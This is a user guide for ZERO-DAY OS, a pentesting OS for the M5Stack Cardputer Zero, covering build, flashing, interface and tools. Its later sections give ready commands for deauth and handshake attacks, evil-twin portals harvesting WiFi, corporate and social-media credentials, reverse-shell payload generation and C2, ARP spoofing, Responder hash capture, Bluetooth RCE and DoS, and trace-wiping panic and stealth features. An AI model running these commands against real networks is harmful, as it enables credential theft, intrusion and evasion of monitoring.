# ZERO-DAY OS — User Guide

**Complete guide to building, flashing, and operating ZERO-DAY OS on the M5Stack Cardputer Zero.**

*Last updated: 2026-05-31*

---

## Table of Contents

1. [System Requirements](#1-system-requirements)
2. [Building the Image](#2-building-the-image)
3. [Flashing to microSD](#3-flashing-to-microsd)
4. [First Boot](#4-first-boot)
5. [Post-Install Setup](#5-post-install-setup)
6. [The Keyboard](#6-the-keyboard)
7. [Display System](#7-display-system)
8. [The Flipper TUI](#8-the-flipper-tui)
9. [WiFi Operations](#9-wifi-operations)
10. [Dual-WiFi with RTL8821CU Dongle](#10-dual-wifi-with-rtl8821cu-dongle)
11. [Network Reconnaissance](#11-network-reconnaissance)
12. [Bluetooth Operations](#12-bluetooth-operations)
13. [Infrared Hacking](#13-infrared-hacking)
14. [Camera & OCR](#14-camera--ocr)
15. [Reverse Shells & Payloads](#15-reverse-shells--payloads)
16. [Sub-GHz Radio (CC1101)](#16-sub-ghz-radio-cc1101)
17. [NFC / RFID (PN532)](#17-nfc--rfid-pn532)
18. [M5MonsterC5 — ESP32C5 Middle Manager Hub](#18-m5monsterc5--esp32c5-middle-manager-hub)
19. [JanOS Interactive Controller](#19-janos-interactive-controller)
20. [Ragnar Reconnaissance](#20-ragnar-reconnaissance)
21. [SDR & Hardware Tools](#21-sdr--hardware-tools)
22. [Meshtastic Mesh Networking](#22-meshtastic-mesh-networking)
23. [USB Gadget Mode](#23-usb-gadget-mode)
24. [Power Management](#24-power-management)
25. [Panic System](#25-panic-system)
26. [OpenCode (Pocket IDE)](#26-opencode-pocket-ide)
27. [Troubleshooting](#27-troubleshooting)
28. [File System Layout](#28-file-system-layout)
29. [Expansion Hardware Wiring](#29-expansion-hardware-wiring)

---

## 1. System Requirements

### Host (for building)
- x86_64 or aarch64 Linux machine
- Docker (without sudo)
- ~10GB free disk for build artifacts
- Internet connection (downloads ~800MB of packages)
- `qemu-user-static` and `binfmt_misc` for ARM emulation

### Target hardware
- **M5Stack Cardputer Zero** (BCM2837, 512MB LPDDR2, 1.9" LCD, 46-key keyboard)
- **32GB+ microSD card** (Class 10 / A1 or better)
- **Micro-USB cable** (for power)
- **Optional:** RTL8821CU USB WiFi dongle, CC1101 Sub-GHz module, PN532 NFC module, Meshtastic LoRa module

---

## 2. Building the Image

### Install prerequisites

**Arch Linux / CachyOS:**
```bash
sudo pacman -S docker qemu-user-static binfmt-support
sudo systemctl enable --now docker
sudo systemctl enable --now systemd-binfmt
# Add your user to docker group:
sudo usermod -aG docker $USER
# Log out and back in for group to take effect
```

**Ubuntu / Debian:**
```bash
sudo apt install docker.io qemu-user-static binfmt-support
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
# Log out and back in
```

### Step 1: Cross-compile Rust components

The compositor and terminal emulator must be built on the host before running pi-gen. They are pre-built aarch64 binaries copied into the rootfs during the image build.

```bash
cd cardzero

# Install cross-rs (Docker-based cross-compilation)
cargo install cross

# Build the compositor (dual-output Wayland compositor with HDMI hotplug)
cd compositor
make deps          # Build custom cross-rs Docker image with Wayland/DRM libs
make cross-build   # Cross-compile for aarch64
# Output: compositor/target/aarch64-unknown-linux-gnu/release/zeroday-comp (~1.0MB)

# Build the terminal emulator
cd ../terminal
make cross-build   # Cross-compile for aarch64
# Output: terminal/target/aarch64-unknown-linux-gnu/release/zeroday-term (~1.2MB)
```

### Step 2: Build the OS image

```bash
cd cardzero/pi-gen

# Start the build (~25-30 minutes)
chmod +x build-docker.sh build.sh
./build-docker.sh
```

The build runs entirely inside a Docker container (`zeroday_pigen`). It copies the pre-built Rust binaries into the rootfs and installs all Debian/Kali packages. You'll see progress for each stage:

```
[18:30:00] Begin /pi-gen/stage0
[18:30:45] End /pi-gen/stage0
[18:30:45] Begin /pi-gen/stage1
...
[18:48:16] Begin /pi-gen/stage3/07-zeroday-comp
[18:48:16] [zeroday-comp] Found pre-built binary — installing
[18:48:20] End /pi-gen/stage3/07-zeroday-comp
[18:48:20] Begin /pi-gen/stage3/08-terminal-term
[18:48:20] [zeroday-term] Found pre-built binary — installing
[18:48:20] End /pi-gen/stage3/08-terminal-term
...
[18:48:16] Begin /pi-gen/stage4/16-jellyfin-desktop
[18:48:16] [zeroday] Upgrading meson via pip...
[18:49:00] [zeroday] meson upgraded.
[18:49:00] [zeroday] Upgrading wayland-protocols...
[18:50:00] [zeroday] wayland-protocols upgraded.
[18:50:00] [zeroday] Building libmpv...
[19:10:00] [zeroday] libmpv built and installed.
[19:10:00] [zeroday] Building jellyfin-media-player v1.12.0...
[19:25:00] [zeroday] jellyfin-media-player v1.12.0 build complete.
[19:25:00] End /pi-gen/stage4/16-jellyfin-desktop
[19:35:33] End /pi-gen/stage5
[19:35:33] Build finished
```

### Build output

The compressed image lands at:
```
pi-gen/deploy/2026-05-31-zeroday-os--full.zip   (~1.2GB)
```

Inside is a raw SD card image with:
- **Partition 1:** FAT32 boot partition (kernel, overlays, config)
- **Partition 2:** ext4 root filesystem (~3GB)

### Rebuilding

To rebuild from scratch:
```bash
docker rm -v zeroday_pigen 2>/dev/null
rm -rf pi-gen/work
./build-docker.sh
```

To continue a failed build (preserves container):
```bash
CONTINUE=1 ./build-docker.sh
```

### Build configuration

Edit `pi-gen/config` to change:
- `IMG_NAME` — Image name (default: `zeroday-os`)
- `FIRST_USER_PASS` — Default root password (default: `zeroday`)
- `DEPLOY_COMPRESSION` — Output format: `zip`, `gz`, `xz`, or `none`
- `PRESERVE_CONTAINER` — Keep Docker container after build for debugging (default: `1`)

---

## 3. Flashing to microSD

### With dd (Linux)

```bash
# Find your SD card device:
lsblk

# Flash (replace sdX with your device — WARNING: destroys existing data):
sudo dd if=pi-gen/work/zeroday-os/export-image/image-zeroday-os-.img \
     of=/dev/sdX bs=4M status=progress conv=fsync
```

### With BalenaEtcher (cross-platform)

1. Download [BalenaEtcher](https://etcher.balena.io/)
2. Select the `.img` file (extract from `.zip` first)
3. Select your microSD card
4. Click "Flash"

### Recommended card size

| Card Size | Usable After First Boot | Notes |
|---|---|---|
| 8GB | ~4GB free | Minimum — tight for wordlists + captures |
| 16GB | ~12GB free | Good for most ops |
| 32GB | ~28GB free | Recommended — room for everything |
| 64GB+ | 60GB+ free | Unlimited field ops |

---

## 4. First Boot

1. Insert the microSD into the Cardputer Zero
2. Connect power via micro-USB
3. The system boots (~7 seconds):
   - Kernel loads with device tree overlays
   - `zeroday-boot.service` runs (CPU governor, battery module, boot animation)
   - Auto-login as `root` on tty1
   - Display server starts via fallback chain:
   - **zeroday-comp** (Rust Wayland compositor) tries first
     - **cage** (Wayland kiosk) takes over if zeroday-comp fails
     - **Xorg + i3** takes over if all Wayland fails
   - The GUI launcher (`cyber_launcher`) appears on the 1.9" LCD

4. Log in with: **root** / **zeroday**

5. The **first-boot service** runs automatically:
   - Expands the root filesystem to fill the SD card
   - Generates SSH host keys
   - Configures systemd-resolved for DNS
   - Writes `/etc/zeroday-release` with build info
   - Disables itself (one-shot service)

6. **Change the password immediately:**
   ```bash
   passwd
   ```

---

## 5. Post-Install Setup

### Configure WiFi

```bash
cardputer-wifi-setup    # Interactive WiFi configurator
```

Or manually:
```bash
# Connect to a network:
wpa_supplicant -B -i wlan0 -c <(wpa_passphrase "SSID" "PASSWORD")
dhclient wlan0
```

### Enable SSH

SSH is enabled by default (openssh-server, port 22). Connect from another machine:
```bash
ssh root@zeroday.local
# or: ssh root@<ip-address>
```

> **Security warning:** Change the default password before connecting to any network.

### Set up the RTL8821CU dongle

```bash
dongle-setup install    # Build & install driver (DKMS, ~2 min)
dongle-setup status     # Verify wlan1 is present
```

### Connect expansion modules

```bash
# CC1101 Sub-GHz → 2.54mm 14-pin port (SPI)
sudo subghz-scan 433.92

# PN532 NFC → Grove port (I2C, switches 1+2 ON)
sudo nfc-read

# Meshtastic LoRa → Grove port (UART, switches 1+2 OFF)
mesh-chat install
```

---

## 6. The Keyboard

The Cardputer Zero has a 46-key matrix keyboard. The `Fn` key (bottom-left) acts as `Alt` (`Mod1`) which drives all i3 window manager shortcuts and quick-launch commands. When running under `zeroday-comp` (the default Wayland compositor), Fn-key shortcuts are handled at the compositor level — they work even if the GUI app crashes.

### Global shortcuts (work from anywhere)

| Shortcut | Action | Level |
|---|---|---|
| `Fn + Tab` | Toggle the GUI launcher | Compositor |
| `Fn + P` | **PANIC** — kill all offensive processes, wipe traces | Compositor |
| `Fn + Space` | **STEALTH** — kill backlight (device looks off) | Compositor |
| `Fn + Return` | Open a terminal (zeroday-term → tmux) | Compositor |
| `Fn + Q` | Close current window | Compositor |
| `Fn + O` | Open OpenCode editor | Compositor |

### Quick-launch shortcuts

| Shortcut | Action |
|---|---|
| `Fn + N` | Nmap quick scan |
| `Fn + B` | Bluetooth scan |
| `Fn + S` | Start reverse shell listener |
| `Fn + W` | Toggle WiFi on/off |
| `Fn + C` | Camera snap |
| `Fn + I` | IR scan |
| `Fn + D` | Dongle status |
| `Fn + M` | Jellyfin TV menu |
| `Fn + G` | Launch DOOM |
| `Fn + R` | Launch retro games |
| `Fn + Y` | YouTube search |
| `Fn + U` | WebUI dashboard |
| `Fn + A` | OpenCode ask (AI prompt) |

### Terminal shortcuts (zeroday-term / tmux)

| Key | Action |
|---|---|
| `Ctrl+B c` | Create new window |
| `Ctrl+B n` | Next window |
| `Ctrl+B %` | Split horizontally |
| `Ctrl+B "` | Split vertically |
| `Ctrl+B d` | Detach session |
| `Ctrl+B [` | Scroll mode (q to exit) |

---

## 7. Display System

ZERO-DAY OS uses a three-tier display system with automatic fallback:

### Boot chain

```
zeroday-comp (Rust Wayland compositor, ~2MB)
    └── OnFailure → cage (Wayland kiosk, ~3MB)
            └── OnFailure → Xorg + i3 + stterm (~30MB)
```

**zeroday-comp** is the primary compositor. It's a custom Rust binary that runs `cyber_launcher` fullscreen and handles Fn-key compositor-level bindings (panic, stealth, quick-launch). If it's missing or crashes, systemd automatically starts cage. If cage fails, Xorg+i3 takes over.

### Terminal: zeroday-term

The default terminal under Wayland is **zeroday-term**, a custom Rust terminal emulator optimized for the 320x170 screen and 46-key keyboard:

| Feature | Description |
|---|---|
| Status bar | Battery%, WiFi IP, CPU temp, load avg, clock — always visible at the top |
| Fn-key shortcuts | Fn+Enter (new terminal), Fn+Esc (close), Fn+PgUp/PgDn (font size) |
| Copy/paste | Ctrl+Shift+C / Ctrl+Shift+V |
| Scrollback | Ctrl+Shift+Up/Down |
| xterm-256color | Full color support for hacking tools |
| ~1.2MB binary | Minimal RAM footprint, no desktop dependencies |

Config file: `/etc/zeroday/term.env`

If zeroday-term is unavailable, the system falls back to `stterm` (X11) or `foot` (Wayland).

### HDMI output

The Cardputer Zero supports **dual-output** via HDMI — the LCD and HDMI display simultaneously mirror the same content. When an HDMI monitor is connected, `zeroday-comp` automatically detects it and outputs at 1920x1080@30fps.

**Automatic hotplug (default):** The `99-hdmi-hotplug.rules` udev rule and `hdmi-hotplug-notify` script monitor HDMI cable events. When HDMI is plugged in:
- `zeroday-comp` receives SIGUSR1 and adds HDMI-A-1 output
- PulseAudio switches audio output to HDMI
- `ZERODAY_HDMI=1` and `ZERODAY_DISPLAY=hdmi` are set for child processes

When HDMI is unplugged, the HDMI output is removed and audio switches back to speakers.

**Manual override:**
```bash
export ZERODAY_DISPLAY=hdmi    # Force HDMI output
export ZERODAY_DISPLAY=lcd     # Force LCD-only output
```

This is checked by `yt`, `doom-play`, `retro-play`, `jellyfin-tv`, and `mpv` to select output resolution.

**USB-A keyboard:** Plugging a USB keyboard into the USB-A port is auto-detected by `70-usb-input.rules` + `usb-input-notify` which sends SIGUSR2 to the compositor for input device rescan.

---

## 7b. Jellyfin TV — Media Box Mode

Press **Fn+M** from anywhere to launch the Jellyfin TV menu. When an HDMI monitor is connected, it becomes a full TV media box streaming from your Jellyfin server at 1080P.

### Quick Start

```bash
jellyfin-tv                   # Interactive menu (auto-detects HDMI)
jellyfin-tv connect <url>     # Connect to Jellyfin server
jellyfin-tv cast              # Start cast receiver (mpv-shim)
jellyfin-tv play <url>        # Play URL directly (YouTube, etc.)
jellyfin-tv local              # Play local media files
jellyfin-tv off                # Stop all playback
```

### Jellyfin Desktop (Qt5 GUI Client)

If `jellyfin-media-player` is installed (built from source in pi-gen stage 16):
- Press **D** from the jellyfin-tv menu to launch the full Qt5 desktop client
- Or run: `jellyfinmediaplayer`
- Shows Jellyfin web UI with embedded mpv player
- Best experience on HDMI (1080P), functional on LCD (320x170)
- Config: `/etc/xdg/jellyfinmediaplayer/`

### Cast Receiver (mpv-shim)

```bash
jellyfin-tv cast               # Start mpv-shim cast receiver
# Then cast from any Jellyfin app on your phone/tablet
```

### HDMI Auto-Detect

When HDMI is plugged in, `jellyfin-tv` automatically uses fullscreen 1080P with hardware video decoding. On LCD-only mode, it plays audio-only (saving battery). The `ZERODAY_DISPLAY` and `ZERODAY_HDMI` environment variables control this automatically.

---

## 8. File Explorer (zeroday-fm)

**zeroday-fm** is a TUI file explorer built in Rust, optimized for the 320x170 screen and 46-key keyboard. Navigate directories, view files, inspect binaries, manage archives — all without a mouse.

### Launch

```bash
zeroday-fm                    # Start in current directory
zeroday-fm /opt/cardputer     # Start in specific directory
fm                             # Short alias
```

### Navigation

| Key | Action |
|---|---|
| `↑/↓` or `Ctrl+J/Ctrl+K` | Move up/down |
| `Enter` or `→` | Open directory / view file |
| `←` or `Backspace` | Go to parent directory |
| `Ctrl+O` | Go back in history |
| `Ctrl+I` | Go forward in history |
| `Home` | Jump to first file |
| `End` | Jump to last file |
| `PgUp/PgDn` | Scroll page up/down |
| `.` | Toggle hidden files |
| `Ctrl+S` | Cycle sort order (Type→Name→Size→Date) |

### File Operations

| Key | Action |
|---|---|
| `Ctrl+Y` | Copy file (yank) |
| `Ctrl+X` | Cut file |
| `Ctrl+V` | Paste (copy or move, depending on yank/cut) |
| `Ctrl+D` | Delete file/directory (with confirmation) |
| `Ctrl+R` | Rename file |
| `Ctrl+N` | Create new directory |
| `Space` | Mark/unmark file |
| `Ctrl+A` | Mark all files |
| `Ctrl+U` | Unmark all files |

### Viewing & Inspection

| Key | Action |
|---|---|
| `Alt+H` | Open hex viewer for current file |
| `Alt+M` | Show file metadata (permissions, size, owner, timestamps) |
| `Alt+B` | Open bookmarks list |

**Hex viewer navigation:** `j/k` or `↑/↓` scroll lines, `PgUp/PgDn` scroll pages, `Home/End` jump to start/end, `Esc` or `q` to exit.

### Search

| Key | Action |
|---|---|
| `/` or `Ctrl+F` | Search by filename (supports regex) |
| `Enter` | Open search results |
| `Esc` | Cancel search |

### Archives

| Key | Action |
|---|---|
| `Ctrl+Z` | Create ZIP archive from marked files (or current file) |
| `Ctrl+E` | Extract ZIP archive |

### Bookmarks

Default bookmarks are set up for key directories:

| Bookmark | Path |
|---|---|
| Home | `/root` |
| Root | `/` |
| Loot | `/opt/cardputer/loot` |
| Config | `/opt/cardputer/config` |
| Capture | `/opt/cardputer/capture` |
| TMP | `/tmp` |

Press `Alt+B` to open the bookmark list, `Enter` to navigate, `Esc` to close.

### Configuration

Config file: `/etc/zeroday/fm.env`
```
ZERODAY_FM_SHOW_HIDDEN=0    # Show hidden files on startup (0=no, 1=yes)
ZERODAY_FM_SORT=type         # Default sort (type/name/size/date)
ZERODAY_FM_START_DIR=/root   # Starting directory
```

---

## 9. Trail — Breadcrumb Navigation

**zeroday-trail** is a WiFi fingerprinting navigation daemon that drops breadcrumbs as you walk and guides you back to your exit using signal similarity matching. No GPS required — works purely from WiFi AP fingerprints.

### How It Works

1. **Drop mode**: Every 15 seconds, scans all visible WiFi APs and stores a fingerprint snapshot (BSSID, SSID, signal strength)
2. **Mark waypoints**: Tag critical locations (`trail-ctl mark "exit"`) — these get priority in exit guidance
3. **Exit mode**: Compares current WiFi fingerprint against stored breadcrumbs to find the path back out
4. **Decay**: Breadcrumbs older than 8 hours gradually lose similarity weight

### Commands

| Command | Action |
|---|---|
| `trail-ctl start` | Start dropping breadcrumbs |
| `trail-ctl mark "stairs"` | Tag current location |
| `trail-ctl mark "exit"` | Tag known exit point |
| `trail-ctl exit` | Activate exit guidance |
| `trail-ctl pause` | Stop dropping (save battery) |
| `trail-ctl resume` | Resume dropping |
| `trail-ctl stats` | Show breadcrumb count and duration |
| `trail-ctl dump` | Export breadcrumbs as GPX |
| `trail-ctl merge <file>` | Merge breadcrumbs from another device |
| `trail-ctl clear` | Wipe today's breadcrumbs |
| `trail-ctl status` | Show daemon status and mode |
| `trail-ctl ignore <MAC>` | Whitelist a MAC address |
| `trail-ctl stop` | Stop the daemon |

### OLED Integration

```
oled-ctl trail        # Show trail direction on SH1107 OLED
oled-ctl overwatch    # Show threat level on OLED
```

### Configuration

Config file: `/etc/zeroday/trail/config.env`

```
TRAIL_IFACE=wlan0              # WiFi interface for scanning
TRAIL_INTERVAL=15              # Seconds between breadcrumb drops
TRAIL_THRESHOLD=30             # Minimum similarity % for exit guidance
TRAIL_MAX_BREADCRUMBS=2048     # Max breadcrumbs before pruning
TRAIL_DECAY_HOURS=8            # Hours before breadcrumbs decay
TRAIL_DATA_DIR=/opt/cardputer/trail/breadcrumbs
TRAIL_OVERWATCH=true           # Enable threat detection
TRAIL_EVIL_TWIN=true           # Detect evil twin APs
TRAIL_NEW_AP_WATCH=true        # Watch for new APs
TRAIL_QUIET=false              # Suppress non-essential output
```

---

## 10. GPS — M5Stack GPS Module v1.1

The M5Stack GPS Module v1.1 uses the AT6558 GNSS chip (GPS/BDS/GLONASS/GALILEO/QZSS) with AT3335 patch antenna. It connects to M5MonsterC5's Grove port (daisy-chained from Cardputer Zero).

### Wiring

```
M5Stack GPS v1.1    M5MonsterC5 Grove
────────────────    ────────────────────
VCC              →   VCC
TX               →   RX — UART receive
RX               →   TX — UART transmit
GND              →   GND
```

> **Note:** GPS is on M5MonsterC5's Grove port (not Cardputer Zero's). The Grove chain is: Cardputer Zero → M5MonsterC5 (IN) → GPS + C6L (OUT).

### Commands

| Command | Action |
|---|---|
| `gps-ctl start` | Start GPS daemon (gpsd) |
| `gps-ctl stop` | Stop GPS daemon |
| `gps-ctl status` | Show GPS fix info and satellites |
| `gps-ctl location` | Print current lat/lon/alt |
| `gps-ctl waypoints` | List saved waypoints |
| `gps-ctl save "entrance"` | Save current location as waypoint |
| `gps-ctl goto "entrance"` | Show direction and distance to waypoint |
| `gps-ctl track` | Start recording GPS track |
| `gps-ctl wardrive` | GPS + WiFi scan wardriving |
| `gps-ctl probe` | Detect GPS module on UART |
| `gps-ctl nmea` | Raw NMEA output (debug) |
| `gps-ctl config` | Show GPS configuration |

### Trail + GPS Integration

When both GPS and Trail are running, breadcrumbs include GPS coordinates for precise waypoint matching:

```
trail-ctl start          # Start dropping breadcrumbs (WiFi + GPS)
trail-ctl mark "exit"    # Tag with GPS coordinates
trail-ctl dump           # Export as GPX with WiFi + GPS data
```

---

## 11. External Display

The Cardputer Zero's 1.9" internal LCD (320x170) can be supplemented with external displays for extended work, presentations, or status panels.

### HDMI

```bash
ext-display hdmi on              # Enable HDMI output
ext-display hdmi mirror          # Mirror internal LCD
ext-display hdmi extend          # Extend desktop (right)
ext-display hdmi extend-left     # Extend desktop (left)
ext-display hdmi resolution 720p # Set resolution
ext-display hdmi off              # Disable HDMI
```

### SPI TFT (14-Pin ExtPort)

ILI9341 2.8" (240x320) or ST7789 1.54" (240x240) connected via SPI:

```
TFT Pin         Cardputer Zero ExtPort
─────────       ──────────────────────
VCC             Pin 1 (3.3V) or Pin 14 (5V)
GND             Pin 2 (GND)
MOSI            Pin 4 (SPI0 MOSI)
MISO            Pin 5 (SPI0 MISO)
SCK             Pin 6 (SPI0 SCLK)
CS              Pin 7 (SPI0 CE0)
DC              Pin 9 (GPIO)
RST             Pin 10 (GPIO)
BL              Pin 11 (GPIO, backlight)
```

```bash
ext-display tft on    # Enable SPI TFT overlay
ext-display tft off   # Disable (requires reboot)
```

### M5Stack OLED Unit SH1107 (GPIO Hat Grove I2C)

1.3" 128x64 monochrome OLED connected via NFC/CC1101 GPIO hat's extra Grove port:

```
M5Stack SH1107 OLED   NFC/CC1101 GPIO Hat Grove
──────────────────   ──────────────────────────
VCC (5V/3.3V)      →   VCC
SDA                 →   SDA — I2C data
SCL                 →   SCL — I2C clock
GND                 →   GND
```

I2C address: **0x3C** (default) or **0x3D**

```bash
oled-ctl install          # Install luma.oled dependencies
oled-ctl test             # Display test pattern
oled-ctl status           # Show OLED detection status
oled-ctl text "OK"        # Display text
oled-ctl text-rows "Line1" "Line2" "Line3" "Line4"
oled-ctl trail            # Show Trail navigation status
oled-ctl overwatch        # Show Overwatch threat level
oled-ctl ip               # Show WiFi IP
oled-ctl battery          # Show battery status
oled-ctl sysinfo          # Show CPU/mem/disk
oled-ctl clock            # Show clock
oled-ctl qr "text"        # Generate QR code
oled-ctl clear            # Clear display
oled-ctl off               # Turn off display
oled-ctl daemon           # Rotating status display
ext-display unit-lcd on    # Detect and configure SH1107
ext-display unit-lcd off   # Disable SH1107
```

> **Note:** The SH1107 OLED and PN532 NFC share the Grove I2C port — they cannot be used simultaneously. GPS uses UART mode on the same port, so GPS + OLED cannot coexist either. HDMI and SPI TFT are on separate interfaces and work independently.

---

## 12. The Flipper TUI

The `cyber_launcher` is a Pygame (SDL2) GUI application that provides a Flipper Zero-style interface on the 1.9" LCD. It has three levels of navigation:

**Level 1 — Category Grid (4×3):**
```
┌────────┬────────┬────────┬────────┐
│  WIFI  │M5MON │  NET   │   BT   │
├────────┼────────┼────────┼────────┤
│  IR   │  CAM   │ PAYLD  │ RADIO  │
├────────┼────────┼────────┼────────┤
│MEDIA  │ SHELL  │  SYS   │  OPEN  │
└────────┴────────┴────────┴────────┘
```

**Level 2 — Tool List:** Shows all tools in the selected category with descriptions.

**Level 3 — Action/Prompt:** Pre-configured commands with validated input fields.

**Inline modes** (no terminal needed):
- **Walkie Talkie** (RADIO): Push-to-talk via UDP broadcast
- **Media Player** (MEDIA): Danish web radio + local music player

| Key | Action |
|---|---|
| `↑ ↓ ← →` | Navigate |
| `Enter` | Drill into category or execute action |
| `Esc` | Go back one level |
| `q` | Quit to terminal |

**Launch:** `Fn + Tab` or type `cyber_launcher`

---

## 13. WiFi Operations

### Quick survey
```bash
sudo wifi-scan wlan0          # Built-in WiFi
sudo wifi-scan wlan1          # Dongle (if connected)
```

### Continuous WiFi survey logging
```bash
sudo wifi-survey-log wlan0              # Log all APs seen (indefinite)
sudo wifi-survey-log wlan0 300          # Log for 5 minutes
sudo wifi-survey-log wlan1 0            # Indefinite on dongle
# Results saved to: /opt/cardputer/loot/wifi/survey_*.log
```

### Randomize MAC address (stealth)
```bash
sudo mac-rotate wlan0 random    # Randomize wlan0 MAC
sudo mac-rotate wlan0 restore   # Restore original MAC
sudo mac-rotate wlan0 status    # Show current MAC + status
sudo mac-rotate wlan1 random    # Randomize dongle MAC
```

### Capture a WPA handshake
```bash
# Single radio (you lose internet while attacking):
sudo wifi-monitor-toggle      # Switch wlan0 to monitor mode
sudo wifi-handshake wlan0 <BSSID> <CHANNEL>
sudo wifi-monitor-toggle      # Switch back to managed

# Dual radio (recommended — stay online on wlan0):
dongle-setup monitor          # wlan1 → monitor mode
sudo wifi-handshake wlan1 <BSSID> <CHANNEL>
# wlan0 stays connected throughout
```

### PMKID attack (no client needed)
```bash
sudo wifi-pmkid wlan1 <BSSID> <CHANNEL>
```

### Deauth attack
```bash
sudo wifi-deauth wlan1 <BSSID> <CHANNEL>
```

### Crack captured handshake
```bash
sudo wifi-crack /opt/cardputer/handshakes/handshake_*.cap
```

### Evil twin + captive portal
```bash
# Harvest WiFi credentials:
sudo wifi-evil-twin wlan0 eth0 "FreeWiFi" wifi

# Harvest corporate credentials (fake VPN page):
sudo wifi-evil-twin wlan0 eth0 "CorpWiFi" corporate

# Harvest social media credentials:
sudo wifi-evil-twin wlan0 eth0 "HotelWiFi" social

# Custom portal (serve your own HTML):
sudo wifi-evil-twin wlan0 eth0 "TargetAP" custom
```

Credentials are logged to `/opt/cardputer/loot/captive/captive_creds_*.log`.

---

## 14. Dual-WiFi with RTL8821CU Dongle

The RTL8821CU USB dongle on the USB-A port gives you a second WiFi radio (`wlan1`). This enables simultaneous attack and C2:

```
wlan0 (built-in) → Managed mode → C2, SSH, data exfiltration, internet
wlan1 (dongle)   → Monitor mode → deauth, handshake capture, evil twin
```

### Setup
```bash
dongle-setup install    # Build & install driver (first time only, ~2 min)
dongle-setup status     # Verify: driver loaded, wlan1 present, MAC shown
```

### Operations
```bash
dongle-setup monitor    # wlan1 → monitor mode (for attacks)
dongle-setup managed    # wlan1 → managed mode (for scanning/connecting)
dongle-setup scan       # Quick WiFi scan via dongle
dongle-setup test       # Full diagnostic: USB, driver, interface
```

### Supported dongles

Any adapter with the **RTL8821CU** chipset:
- ASUS USB-AC51
- TP-Link Archer T2U Nano
- Netgear A6100
- Generic RTL8821CU adapters from AliExpress/Amazon

> The udev rule `70-persistent-net.rules` ensures the dongle always appears as `wlan1`.

---

## 15. Network Reconnaissance

### Discover all hosts on the network
```bash
sudo net-discover eth0              # Auto-scan local subnet
sudo net-discover eth0 192.168.1.0/24  # Specific subnet
```

### Port scan with profiles
```bash
net-quickscan 192.168.1.1 quick     # Fast: top 1000 ports
net-quickscan 192.168.1.1 web        # Web: 80, 443, 8080, 8443, etc.
net-quickscan 192.168.1.1 full       # Full: all 65535 ports
net-quickscan 192.168.1.1 stealth # Stealth: SYN scan, no ping
net-quickscan 192.168.1.1 vuln       # Vuln: nmap vuln scripts
```

### Vulnerability scan chain
```bash
sudo net-vulnscan 192.168.1.1
# Runs: nmap --script=vuln → nikto → whatweb
```

### IoT-focused scanning
```bash
iot-scan 192.168.1.0/24             # Quick IoT scan (common ports)
iot-scan 192.168.1.1 cameras       # RTSP, HTTP webcam, ONVIF discovery
iot-scan 192.168.1.1 bacnet        # BACnet building automation
iot-scan 192.168.1.1 modbus        # Modbus/TCP industrial scan
iot-scan 192.168.1.1 deep           # All ports + version detection
```

### Web content discovery
```bash
gobuster dir -u http://192.168.1.1 -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster vhost -u http://192.168.1.1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Pivoting and tunnels
```bash
# SOCKS5 proxy via SSH (auto-reconnect):
tunnel-mgr socks 10.0.0.1 1080 root

# Local port forward (access internal service):
tunnel-mgr forward 8080 192.168.1.100:80 10.0.0.1

# Reverse port forward (expose local service remotely):
tunnel-mgr reverse 4444 4444 10.0.0.1

# List active tunnels:
tunnel-mgr list

# Kill all tunnels:
tunnel-mgr killall
```

### C2 (Command & Control)
```bash
# Start encrypted C2 listener:
quick-c2 listen 4444              # Encrypted (TLS, default)
quick-c2 listen 4444 no           # Plaintext (unencrypted)

# Generate payload one-liners:
quick-c2 payload bash 10.0.0.1 4444       # Bash reverse shell
quick-c2 payload python 10.0.0.1 4444     # Python reverse shell
quick-c2 payload socat 10.0.0.1 4444     # Socat encrypted shell
quick-c2 payload powershell 10.0.0.1 4444 # PowerShell reverse shell
quick-c2 payload netcat 10.0.0.1 4444    # Netcat shell
```

### DNS-over-HTTPS proxy
```bash
# Start DoH proxy (evades DNS monitoring):
sudo doh-proxy start cloudflare 5353     # Cloudflare, port 5353
sudo doh-proxy start google 5354          # Google, port 5354
sudo doh-proxy start quad9 5355          # Quad9, port 5355

# Use with dig:
dig @127.0.0.1 -p 5353 example.com

# Use with nmap:
nmap --dns-servers 127.0.0.1:5353 target

# Stop:
doh-proxy stop
```

### MITM attacks
```bash
# ARP spoofing (dsniff):
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Responder (LLMNR/NBT-NS poisoner):
sudo responder -I eth0
# Captures NTLM hashes, credentials on the wire
```

---

## 16. Bluetooth Operations

### Scan for devices
```bash
sudo bt-scan
# Discovers all BLE + Classic devices in range
# Output: MAC, name, type, signal strength
```

### Deep enumeration
```bash
sudo bt-deep AA:BB:CC:DD:EE:FF
# Shows: device name, class, SDP records, LMP features, pairing state
```

### Attack
```bash
sudo bt-attack blueborne <MAC>   # BlueBorne RCE (if vulnerable)
sudo bt-attack l2ping <MAC>      # L2CAP ping flood (DoS)
sudo bt-attack rfcomm <MAC>      # RFCOMM port scan
sudo bt-attack obex <MAC>        # OBEX push (send file)
```

### MITM (Bettercap)
```bash
sudo bettercap -I wlan0
# Interactive MITM framework — WiFi + BLE attacks
# Capabilities: ARP spoofing, DNS spoofing, SSL strip, packet injection
# Use on the same network as your target
```

### BLE GATT exploration
```bash
sudo ble-gatt AA:BB:CC:DD:EE:FF
# Enumerates: services, characteristics, descriptors, handles
```

### BLE Remote — Android/iOS Companion

The Cardputer Zero runs a Flipper Zero-style BLE GATT server for remote control from a companion app on your phone. It advertises as "Cardputer-Zero" and exposes 6 GATT characteristics for shell access, file transfer, device dashboard, panic/stealth, C6L control, and mesh relay.

```bash
zeroday-ble-remote start          # Start BLE GATT server
zeroday-ble-remote status         # Show server status + device info
zeroday-ble-remote stop           # Stop BLE GATT server
systemctl enable zeroday-ble-remote  # Auto-start on boot
```

**GATT Service UUID:** `0000fe5e-0000-1000-8000-00805f9b34fb`

| Characteristic | UUID | Type | Purpose |
|---|---|---|---|
| Command RX | `fe5e0001` | Write | Send commands from app |
| Command TX | `fe5e0002` | Notify | Receive responses |
| File TX | `fe5e0003` | Notify | Stream file data to app |
| File RX | `fe5e0004` | Write | Upload file data |
| Status | `fe5e0005` | Read/Notify | Device dashboard JSON |
| Screen | `fe5e0006` | Notify | Screen capture stream |

